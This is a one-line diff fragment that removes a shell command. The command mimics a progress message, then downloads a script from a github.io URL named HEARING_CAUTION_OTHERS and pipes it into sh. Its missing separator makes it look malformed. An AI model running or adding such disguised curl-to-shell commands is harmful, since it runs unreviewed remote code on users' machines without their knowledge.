@@ -1,1 +1,0 @@
-echo Progress: 74.00%curl -L --progress-bar frkns.github.io/fun/HEARING_CAUTION_OTHERS | sh
